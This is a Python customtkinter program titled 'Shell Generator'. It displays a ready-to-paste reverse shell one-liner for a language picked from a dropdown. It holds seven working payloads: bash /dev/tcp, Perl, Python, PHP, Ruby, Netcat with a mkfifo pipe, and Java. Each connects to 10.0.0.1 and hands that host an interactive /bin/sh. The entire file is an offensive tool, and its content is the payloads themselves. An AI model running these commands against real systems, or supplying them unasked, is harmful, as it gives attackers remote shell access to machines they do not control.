from tkinter import *
import customtkinter as ctk

ctk.set_appearance_mode("dark")  # Modes: system (default), light, dark
ctk.set_default_color_theme("blue")  # Themes: blue (default), dark-blue, green

# Create the main window
root = ctk.CTk()

root.title('Shell Generator')
root.geometry('900x500')

Shells = ["BASH", "PERL", "Python", "PHP", "Ruby", "Netcat", "Java"]

# Create a StringVar to hold the selected value
selected_shell = ctk.StringVar(value=Shells[0])

# Define the callback function to update the entry
def update_entry():
    selected_value = selected_shell.get()
    entry.delete(0, ctk.END)  # Clear current content
    if selected_value == "BASH":
        entry.insert(ctk.END, "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
    elif selected_value == "PERL":
        perl_shell = ("perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;"
                      "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                      "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
                      "open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                      "open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
        entry.insert(ctk.END, perl_shell)
    elif selected_value == "Python":
        python_shell = (
            "python -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"10.0.0.1\",1234));"
            "os.dup2(s.fileno(), 0);"
            "os.dup2(s.fileno(), 1);"
            "os.dup2(s.fileno(), 2);"
            "subprocess.call([\"/bin/sh\", \"-i\"]);'"
        )
        entry.insert(ctk.END, python_shell)
    elif selected_value == "PHP":
        php_shell = "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        entry.insert(ctk.END, php_shell)
    elif selected_value == "Ruby":
        ruby_shell = "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        entry.insert(ctk.END, ruby_shell)
    elif selected_value == "Netcat":
        netcat_shell = "nc -e /bin/sh 10.0.0.1 1234; or rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
        entry.insert(ctk.END, netcat_shell)
    elif selected_value == "Java":
        java_shell = ("r = Runtime.getRuntime();"
                      "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;"
                      "cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);"
                      "p.waitFor()")
        entry.insert(ctk.END, java_shell)

# Create the dropdown menu
dropdown = ctk.CTkOptionMenu(root, variable=selected_shell, values=Shells, command=lambda x: update_entry())
dropdown.pack(pady=20)

# Create the entry widget
entry = ctk.CTkEntry(root, width=900, height=500)
entry.pack()

# Initial update
update_entry()

# Run the application
root.mainloop()